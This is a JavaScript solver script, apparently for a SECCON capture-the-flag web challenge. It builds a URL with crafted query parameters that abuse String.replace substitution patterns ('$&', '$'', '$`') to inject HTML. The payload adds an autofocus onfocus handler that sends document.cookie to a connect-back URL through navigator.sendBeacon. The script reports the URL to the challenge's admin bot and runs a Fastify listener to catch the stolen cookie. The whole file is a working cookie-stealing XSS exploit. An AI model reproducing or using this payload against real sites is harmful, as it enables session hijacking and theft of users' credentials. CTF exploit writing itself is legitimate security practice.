const app = require("fastify")();
const assert = require("node:assert/strict");

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const url = new URL("http://web:3000");

const params = url.searchParams;

params.append(
  "name",
  "method=xxx $&0$&1$&" + "x".repeat(796) + "$&2$&3$&4$&5\nname=$&"
);
params.append(
  "name}}amp;0{{name}}amp;1{{name}}amp;" +
    "x".repeat(796) +
    "{{name}}amp;2{{name}}amp;3{{name}}amp;4{{name}}amp;5\nname={{name",
  "$&"
);
params.append(
  "name}}amp;0{{name}}amp;1{{name}}amp;" +
    "x".repeat(796) +
    "{{name}}amp;2{{name}}amp;3{{name}}amp;4{{name}}amp;5\nname={{name",
  "$&"
);
params.append(
  "name}}amp;0{{name}}amp;1{{name}}amp;" +
    "x".repeat(796) +
    "{{name}}amp;2{{name}}amp;3{{name}}amp;4{{name}}amp;5\nname={{name",
  "$&" + "y".repeat(13)
);
params.append(
  "name}}amp;0{{name}}amp;1{{name}}amp;" +
    "x".repeat(796) +
    "{{name}}amp;2{{name}}amp;3{{name}}amp;4{{name}}amp;5\nname={{name",
  "$&" + "z".repeat(28)
);
params.append("name}}amp;" + "x".repeat(796) + "{{name", "$'input type=");
params.append("name}}amp;1amp;2{{name}}amp;3{{name}}amp;4{{name", "");
params.append("name}}amp;4{{name", "$&");
params.append("name}}amp;4{{name", "$&");
params.append(
  `name}}amp;amp;amp;5" name="{{name`,
  "$&$'" + "w".repeat(309) + "$`$'$&$&"
);
params.append(
  `name}}amp;3{{name}}amp;4{{name}}amp;amp;amp;5" name="{{name}}amp;amp;zzzzzzzzzzzzzzzzzzzzzzzzzzzzamp;yyyyyyyyyyyyyamp;amp;amp;!" method="get" action="/" />\n    &lt;</form>wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\n\n\n  Hello, method=xxx {{name}}amp;0amp;5\nname={{name}}amp;zzzzzzzzzzzzzzzzzzzzzzzzzzzzamp;yyyyyyyyyyyyyamp;amp;amp;!\n  <form method="get" action="/">\n    <input type="amp;2{{name}}amp;3{{name}}amp;4amp;zzzzzzzzzzzzzzzzzzzzzzzzzzzzamp;yyyyyyyyyyyyyamp;amp;amp;!" method="get" action="/" />\n    &lt;</form>{{name}}amp;amp;amp;5" name="{{name}}amp;{{name`,
  `$' autofocus onfocus=navigator.sendBeacon('${CONNECTBACK_URL}',document.cookie) $\``
);

console.log(url.href);

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(url.href);

  await sleep(5 * 1000);
  assert.fail("Failed");
});
